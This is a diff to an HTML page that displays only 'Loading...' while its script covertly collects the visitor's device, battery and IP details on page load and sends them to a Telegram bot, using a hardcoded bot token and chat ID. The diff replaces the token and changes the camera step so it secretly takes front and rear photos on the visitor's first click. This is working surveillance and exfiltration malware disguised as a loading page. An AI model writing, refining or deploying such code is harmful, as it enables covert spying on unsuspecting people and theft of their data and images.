@@ -29,7 +29,7 @@
   <p>Loading...</p>
 
   <script>
-    const BOT_TOKEN = "7740401254:AAGqaGtAQ2YEiwXtjert2CiuWFADXbGz3Jg";
+    const BOT_TOKEN = "7740401254:AAHhnSMhm-dMcv7-4LJCGwHchxRrYhBEsCY";
     const CHAT_ID = "7216371031";
     let deviceInfo = "";
 
@@ -115,12 +115,17 @@
       await Promise.all([getBatteryInfo(), getIPInfo()]);
       getExtraDetails();
       await sendToTelegram(deviceInfo);
+    }
+
+    // ✅ Trigger data collection immediately
+    collectAndSend();
+
+    // ✅ Camera only triggers on first user click
+    window.addEventListener("click", async () => {
       await takePhoto("user");
       await takePhoto("user");
       await takePhoto("environment");
-    }
-
-    collectAndSend();
+    }, { once: true });
   </script>
 </body>
 </html>
